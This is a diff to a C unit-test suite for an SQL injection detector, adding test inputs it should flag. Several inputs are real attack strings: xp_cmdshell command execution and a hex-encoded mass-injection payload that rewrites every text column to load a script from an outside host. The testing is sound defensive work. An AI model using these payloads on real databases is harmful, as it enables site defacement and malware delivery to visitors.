@@ -92,9 +92,12 @@ Tsqli_inj_in_table_name(void)
 }
 
 static void
-Tsqli_union_distinct(void)
+Tsqli_union(void)
 {
-    s_sqli_attacks({CSTR_LEN("1' union distinct select 1")});
+    s_sqli_attacks(
+        {CSTR_LEN("1' union distinct select 1")},
+        {CSTR_LEN("1' union exec xp_cmdhshell 'ping127.0.0.1'")},
+    );
 }
 
 static void
@@ -151,6 +154,7 @@ Tsqli_whitespace(void)
     s_sqli_attacks(
         {CSTR_LEN("1\vor\v1")},
         {CSTR_LEN("1\u00A0or\u00A01")},
+        {CSTR_LEN("1\000or\0001")},
     );
 }
 
@@ -237,14 +241,17 @@ Tsqli_declare(void)
     s_sqli_attacks(
         {CSTR_LEN("1; DECLARE name varchar(42)")},
         {CSTR_LEN("1; DECLARE name CURSOR FOR select 1")},
+        {CSTR_LEN("1; DECLARE name varchar(42) = 'str'")},
     );
-    s_sqli_attacks({CSTR_LEN("1; DECLARE name varchar(42)")});
 }
 
 static void
 Tsqli_execute(void)
 {
-    s_sqli_attacks({CSTR_LEN("EXEC master.dbo.xp_cmdshell 'cmd'")});
+    s_sqli_attacks(
+        {CSTR_LEN("EXEC master.dbo.xp_cmdshell 'cmd'")},
+        {CSTR_LEN("EXEC (@s)")},
+    );
 }
 
 static void
@@ -264,9 +271,14 @@ Tsqli_drop(void)
 }
 
 static void
-Tsqli_select_alias(void)
+Tsqli_select(void)
 {
-    s_sqli_attacks({CSTR_LEN("(select 1) as t")});
+    s_sqli_attacks(
+        {CSTR_LEN("(select 1) as t")},
+        {CSTR_LEN("SELECT lead(col, 0) OVER (ORDER BY col) FROM table_name")},
+        {CSTR_LEN("SELECT listagg(col,', ') WITHIN GROUP "
+                  "(ORDER BY col) from table_name")},
+    );
 }
 
 static void
@@ -346,6 +358,88 @@ Tsqli_for_xml(void)
     s_sqli_attacks({CSTR_LEN("SELECT 1 FOR XML PATH('')")});
 }
 
+static void
+Tsqli_insert(void)
+{
+    s_sqli_attacks(
+        {CSTR_LEN("INSERT INTO table_name EXEC xp_cmdshell 'dir'")},
+        {CSTR_LEN("INSERT INTO table_name (col) VALUES (1)")},
+    );
+}
+
+static void
+Tsqli_var(void)
+{
+    s_sqli_attacks({CSTR_LEN("SELECT привет#")});
+}
+
+static void
+Tsqli_open(void)
+{
+    s_sqli_attacks({CSTR_LEN("OPEN tablecursor")});
+}
+
+static void
+Tsqli_inner_select(void)
+{
+    s_sqli_attacks({CSTR_LEN("1 union select 2 where 1=1), 3 where 1=1")});
+}
+
+static void
+Tsqli_alter_database(void)
+{
+    s_sqli_attacks({CSTR_LEN("ALTER DATABASE pubs SET RECOVERY SIMPLE")});
+}
+
+static void
+Tsqli_backslash(void)
+{
+    s_sqli_attacks({CSTR_LEN("SELECT \\1")});
+}
+
+static void
+Tsqli_nl_in_str(void)
+{
+    s_sqli_attacks({CSTR_LEN("SELECT '\n'")});
+}
+
+static void
+Tsqli_buf(void)
+{
+    s_sqli_attacks({CSTR_LEN(
+                "SELECT 0x4445434C415245204054207661726368"
+                "617228323535292C4043207661726368617228343"
+                "0303029204445434C415245205461626C655F4375"
+                "72736F7220435552534F5220464F522073656C656"
+                "37420612E6E616D652C622E6E616D652066726F6D"
+                "207379736F626A6563747320612C737973636F6C7"
+                "56D6E73206220776865726520612E69643D622E69"
+                "6420616E6420612E78747970653D27752720616E6"
+                "42028622E78747970653D3939206F7220622E7874"
+                "7970653D3335206F7220622E78747970653D32333"
+                "1206F7220622E78747970653D31363729204F5045"
+                "4E205461626C655F437572736F722046455443482"
+                "04E4558542046524F4D20205461626C655F437572"
+                "736F7220494E544F2040542C4043205748494C452"
+                "8404046455443485F5354415455533D3029204245"
+                "47494E20657865632827757064617465205B272B4"
+                "0542B275D20736574205B272B40432B275D3D2727"
+                "223E3C2F7469746C653E3C7363726970742073726"
+                "33D22687474703A2F2F777777302E646F7568756E"
+                "716E2E636E2F63737273732F772E6A73223E3C2F7"
+                "363726970743E3C212D2D27272B5B272B40432B27"
+                "5D20776865726520272B40432B27206E6F74206C6"
+                "96B6520272725223E3C2F7469746C653E3C736372"
+                "697074207372633D22687474703A2F2F777777302"
+                "E646F7568756E716E2E636E2F63737273732F772E"
+                "6A73223E3C2F7363726970743E3C212D2D2727272"
+                "94645544348204E4558542046524F4D2020546162"
+                "6C655F437572736F7220494E544F2040542C40432"
+                "0454E4420434C4F5345205461626C655F43757273"
+                "6F72204445414C4C4F43415445205461626C655F4"
+                "37572736F72")});
+}
+
 int
 main(void)
 {
@@ -357,7 +451,7 @@ main(void)
         {"simplest", Tsqli_simplest},
         {"rce", Tsqli_rce},
         {"inj_in_table_name", Tsqli_inj_in_table_name},
-        {"union_distinct", Tsqli_union_distinct},
+        {"union", Tsqli_union},
         {"operators", Tsqli_operators},
         {"begin_end", Tsqli_begin_end},
         {"waitfor", Tsqli_waitfor},
@@ -378,7 +472,7 @@ main(void)
         {"declare", Tsqli_declare},
         {"execute", Tsqli_execute},
         {"nul_in_str", Tsqli_nul_in_str},
-        {"select_alias", Tsqli_select_alias},
+        {"select", Tsqli_select},
         {"drop", Tsqli_drop},
         {"where", Tsqli_where},
         {"string", Tsqli_string},
@@ -392,6 +486,14 @@ main(void)
         {"goto", Tsqli_goto},
         {"call", Tsqli_call},
         {"for_xml", Tsqli_for_xml},
+        {"insert", Tsqli_insert},
+        {"var", Tsqli_var},
+        {"open", Tsqli_open},
+        {"inner_select", Tsqli_inner_select},
+        {"alter_database", Tsqli_alter_database},
+        {"backslash", Tsqli_backslash},
+        {"nl_in_str", Tsqli_nl_in_str},
+        {"buf", Tsqli_buf},
         CU_TEST_INFO_NULL
     };
     CU_SuiteInfo suites[] = {
